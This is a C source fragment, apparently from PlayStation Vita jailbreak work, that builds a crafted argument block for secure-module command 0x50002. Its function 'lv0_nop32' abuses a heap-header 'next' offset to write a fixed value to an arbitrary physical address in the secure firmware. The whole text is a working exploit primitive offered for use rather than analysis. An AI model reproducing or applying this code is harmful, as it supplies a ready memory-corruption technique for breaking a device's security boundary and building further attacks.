#define SCE_SBL_SM_COMM_FID_SM_AUTH_SPKG 0x40002
#define SCE_SBL_SM_COMM_FID_SM_ENCIND_SLSK 0x50002
#define SCE_SBL_SM_COMM_FID_SM_SNVS_ENCDEC_SECTORS 0xB0002

typedef struct {
    void* addr;
    uint32_t length;
} __attribute__((packed)) addr_pair;

typedef struct {
    uint32_t unused_0[2];
    uint32_t use_lv2_mode_0; // if 1, use lv2 list
    uint32_t use_lv2_mode_1; // if 1, use lv2 list
    uint32_t unused_10[3];
    uint32_t list_count; // must be < 0x1F1
    uint32_t unused_20[4];
    uint32_t total_count; // only used in LV1 mode
    uint32_t unused_34[1];
    union {
        addr_pair lv1[0x1F1];
        addr_pair lv2[0x1F1];
    } list;
} __attribute__((packed)) cmd_0x50002_t;

typedef struct lv0_heap_hdr {
    void* data;
    uint32_t size;
    uint32_t size_aligned;
    uint32_t padding;
    struct lv0_heap_hdr* prev;
    struct lv0_heap_hdr* next;
} __attribute__((packed)) lv0_heap_hdr;

cmd_0x50002_t lv0_cargs;

/*
    update_service_sm::0x50002 write primitive
    - writes u32 0x2000 to physical [addr]
    - [addr] must be aligned to 4
*/
static int lv0_nop32(uint32_t addr, int ctx) {
    int ret = 0, sm_ret = 0;
    memset(&lv0_cargs, 0, sizeof(cmd_0x50002_t));
    lv0_cargs.use_lv2_mode_0 = lv0_cargs.use_lv2_mode_1 = 0;
    lv0_cargs.list_count = 3;
    lv0_cargs.total_count = 1;
    lv0_cargs.list.lv1[0].addr = lv0_cargs.list.lv1[1].addr = (void *)0x50000000;
    lv0_cargs.list.lv1[0].length = lv0_cargs.list.lv1[1].length = 0x10;
    lv0_cargs.list.lv1[2].addr = 0;
    lv0_cargs.list.lv1[2].length = addr - offsetof(lv0_heap_hdr, next);
    ret = TAI_CONTINUE(int, ksceSblSmCommCallFuncRef, ctx, SCE_SBL_SM_COMM_FID_SM_ENCIND_SLSK, &sm_ret, &lv0_cargs, sizeof(cmd_0x50002_t));
    if (sm_ret < 0) {
        return sm_ret;
    }
    return ret;
}